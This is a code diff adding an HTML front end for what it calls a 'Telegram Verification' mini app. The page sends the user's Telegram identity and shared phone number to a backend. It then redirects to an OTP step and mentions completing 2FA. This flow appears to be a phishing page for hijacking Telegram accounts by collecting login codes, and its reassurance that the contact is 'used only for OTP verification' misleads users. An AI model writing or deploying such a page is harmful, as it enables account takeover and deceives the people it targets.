@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px 20px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            opacity: 0.9;
+            font-size: 14px;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, opacity 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            opacity: 0.95;
+        }
+        
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .btn-secondary {
+            background: #666;
+        }
+        
+        .btn-secondary:hover {
+            background: #555;
+        }
+        
+        .error {
+            background: #ffebee;
+            color: #c62828;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .error.show {
+            display: block;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 40px 20px;
+        }
+        
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .info-box {
+            background: #e8f5e9;
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        
+        .phone-display {
+            background: #f0f0f0;
+            padding: 12px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            text-align: center;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔐 Account Verification</h1>
+            <p>Verify your Telegram account</p>
+        </div>
+        
+        <div class="content">
+            <!-- Initial Screen -->
+            <div id="initial-screen">
+                <div class="info-box">
+                    <b>Verification Process:</b><br>
+                    1. Click "Share Contact" below<br>
+                    2. OTP will be sent to your phone<br>
+                    3. Enter OTP in next screen<br>
+                    4. Complete 2FA if enabled
+                </div>
+                
+                <div class="error" id="error-message"></div>
+                
+                <button class="btn" onclick="shareContact()" id="share-btn">
+                    📞 Share My Contact
+                </button>
+                
+                <p style="text-align: center; color: #666; font-size: 14px; margin-top: 15px;">
+                    Your contact will be used only for OTP verification
+                </p>
+            </div>
+            
+            <!-- Contact Shared Screen -->
+            <div id="contact-screen" class="hidden">
+                <div class="phone-display" id="phone-display">
+                    Phone: Not shared yet
+                </div>
+                
+                <div class="error" id="contact-error"></div>
+                
+                <div class="info-box">
+                    ✅ Contact shared successfully!<br>
+                    Sending OTP to your phone...
+                </div>
+            </div>
+            
+            <!-- Loading Screen -->
+            <div id="loading-screen" class="hidden">
+                <div class="loading">
+                    <div class="loading-spinner"></div>
+                    <p id="loading-text">Processing...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let sessionId = null;
+        let phoneNumber = null;
+        
+        // Initialize WebApp
+        document.addEventListener('DOMContentLoaded', function() {
+            // Get Telegram WebApp user data
+            const tg = window.Telegram?.WebApp;
+            
+            if (tg) {
+                // Initialize WebApp
+                tg.expand();
+                tg.enableClosingConfirmation();
+                
+                // Get user info
+                const user = tg.initDataUnsafe?.user || {};
+                const userId = user.id || 'unknown';
+                const username = user.username || '';
+                const firstName = user.first_name || '';
+                const lastName = user.last_name || '';
+                
+                // Initialize session with backend
+                fetch('/init-session', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        user_id: userId,
+                        username: username,
+                        first_name: firstName,
+                        last_name: lastName
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        sessionId = data.session_id;
+                        console.log('Session created:', sessionId);
+                    } else {
+                        showError('Failed to initialize session');
+                    }
+                })
+                .catch(error => {
+                    console.error('Session init error:', error);
+                    showError('Connection error. Please try again.');
+                });
+            } else {
+                // For testing outside Telegram
+                console.log('Running outside Telegram WebApp');
+                fetch('/init-session', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        user_id: 'test_user',
+                        username: 'test',
+                        first_name: 'Test',
+                        last_name: 'User'
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        sessionId = data.session_id;
+                        console.log('Test session created:', sessionId);
+                    }
+                });
+            }
+        });
+        
+        function shareContact() {
+            if (!sessionId) {
+                showError('Session not initialized. Please wait...');
+                return;
+            }
+            
+            const tg = window.Telegram?.WebApp;
+            
+            if (tg && tg.showContactRequest) {
+                // Request contact sharing via Telegram WebApp
+                tg.showContactRequest(async (contact) => {
+                    if (contact) {
+                        handleContactReceived(contact);
+                    } else {
+                        showError('Contact sharing cancelled');
+                    }
+                });
+            } else {
+                // Fallback for testing
+                const testPhone = prompt('Enter phone number for testing (with +):', '+1234567890');
+                if (testPhone) {
+                    const fakeContact = {
+                        phone_number: testPhone,
+                        first_name: 'Test',
+                        last_name: 'User'
+                    };
+                    handleContactReceived(fakeContact);
+                }
+            }
+        }
+        
+        function handleContactReceived(contact) {
+            phoneNumber = contact.phone_number;
+            
+            // Show contact screen
+            document.getElementById('initial-screen').classList.add('hidden');
+            document.getElementById('contact-screen').classList.remove('hidden');
+            document.getElementById('phone-display').textContent = `Phone: ${phoneNumber}`;
+            
+            // Send contact to backend
+            sendContactToBackend(phoneNumber);
+        }
+        
+        function sendContactToBackend(phone) {
+            showLoading('Sending OTP...');
+            
+            fetch('/api/verify-contact', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    session_id: sessionId,
+                    phone: phone
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    // Redirect to OTP page
+                    window.location.href = data.redirect_url;
+                } else {
+                    hideLoading();
+                    document.getElementById('contact-error').textContent = data.error || 'Failed to send OTP';
+                    document.getElementById('contact-error').classList.add('show');
+                    
+                    // Show retry button
+                    setTimeout(() => {
+                        document.getElementById('contact-screen').classList.add('hidden');
+                        document.getElementById('initial-screen').classList.remove('hidden');
+                    }, 3000);
+                }
+            })
+            .catch(error => {
+                hideLoading();
+                showError('Network error. Please try again.');
+            });
+        }
+        
+        function showLoading(message) {
+            document.getElementById('loading-text').textContent = message || 'Processing...';
+            document.getElementById('contact-screen').classList.add('hidden');
+            document.getElementById('loading-screen').classList.remove('hidden');
+        }
+        
+        function hideLoading() {
+            document.getElementById('loading-screen').classList.add('hidden');
+        }
+        
+        function showError(message) {
+            const errorEl = document.getElementById('error-message');
+            errorEl.textContent = message;
+            errorEl.classList.add('show');
+            
+            setTimeout(() => {
+                errorEl.classList.remove('show');
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
